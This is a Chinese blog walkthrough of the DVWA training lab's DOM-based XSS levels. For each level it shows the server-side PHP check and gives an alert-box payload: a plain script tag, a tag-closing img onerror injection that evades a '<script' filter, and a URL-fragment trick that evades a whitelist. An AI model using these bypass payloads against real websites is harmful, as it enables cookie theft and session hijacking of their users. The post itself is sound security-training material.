---
title: "网络安全 DVWA通关指南 DVWA DOM Based Cross Site Scripting (DOM型 XSS)"
date: 2024-09-29 12:23:38
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "xss"
- "前端"
- "web安全"
- "网络安全"
- "安全"
- "DVWA"
---



## DVWA DOM Based Cross Site Scripting (DOM型 XSS)

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244123.jpeg)



---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)

---

> ### XSS跨站原理
> 
> 当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞。这个“跨”实际上属于浏览器的特性，而不是缺陷;
> 
> 浏览器同源策略：只有发布Cookie的网站才能读取Cookie。
> 
> 会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害
> 
> #### DOM型
> 
> 基于文档对象模型(Document Object Model)的一种漏洞；
> 
> DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；
> 
> Dom型 xss 是通过 url 传入参数去控制触发的；
> 
> Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中。

### Low

1、分析网页源代码

```php
<?php

# No protections, anything goes

?>
//没有任何防御措施
```

 ![image-20240425141612735](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244124.png)

2、修改default，在URL拼接Payload

```
<script>alert(/XSS/)</script>
```

 ![image-20240425141658717](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244125.png)

### Medium

1、分析网页源代码

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
	$default = $_GET['default'];
	
	# Do not allow script tags
	if (stripos ($default, "<script") !== false) {
		header ("location: ?default=English");
		exit;
	}
}

?>
```

增加对"<script"字符的过滤，查看前端代码

 ![image-20240425143147799](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244126.png)

2、构造闭合"option"和"select"标签，执行弹出"/xss/"的语句

```
</optin></select><img src = 1 onerror = alert(/xss/)>
```

 ![image-20240616160139823](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244127.png)

 ![image-20240616161058852](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244128.png)

### High

1、分析网页源代码

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

	# White list the allowable languages
	switch ($_GET['default']) {
		case "French":
		case "English":
		case "German":
		case "Spanish":
			# ok
			break;
		default:
			header ("location: ?default=English");
			exit;
	}
}

?>
```

2、在注入的 payload 中加入注释符 “#”，注释后边的内容不会发送到服务端，但是会被前端代码所执行。

```
(空格)#<script>alert(/xss/)</script>
```

 ![image-20240616161314789](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244129.png)

 ![image-20240616161408461](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165244130.png)

### Impossible

```php
<?php

# Don't need to do anything, protction handled on the client side

?>
# 大多数情况下浏览器都会对 URL 中的内容进行编码，这会阻止任何注入的 JavaScript 被执行。
```